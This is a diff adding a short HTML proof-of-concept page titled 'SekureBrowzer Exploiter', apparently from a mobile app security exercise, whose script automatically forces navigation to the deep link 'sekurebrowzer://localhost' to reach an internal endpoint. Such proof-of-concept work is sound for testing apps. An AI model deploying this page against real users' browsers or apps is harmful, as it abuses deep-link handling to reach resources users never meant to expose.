@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SekureBrowzer Exploiter</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
+        .box { background: white; padding: 20px; border-radius: 8px; border: 1px solid #ccc; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>Internal Resource Access</h1>
+        <p id="status">Attempting to trigger local resource...</p>
+        
+        <a href="sekurebrowzer://localhost" id="exploit-link">Click to Access Localhost</a>
+    </div>
+
+    <script>
+        // 1. Log to the console for debugging via Frida
+        console.log("Exploit page loaded inside SekureBrowzer");
+
+        // 2. Automatically trigger the deep link
+        function triggerExploit() {
+            try {
+                document.getElementById('status').innerText = "Triggering...";
+                // Attempt to force navigation to the internal endpoint
+                window.location.href = "sekurebrowzer://localhost";
+            } catch (e) {
+                document.getElementById('status').innerText = "Error: " + e;
+            }
+        }
+
+        // Delay slightly to ensure WebKit is ready
+        setTimeout(triggerExploit, 1000);
+    </script>
+</body>
+</html>
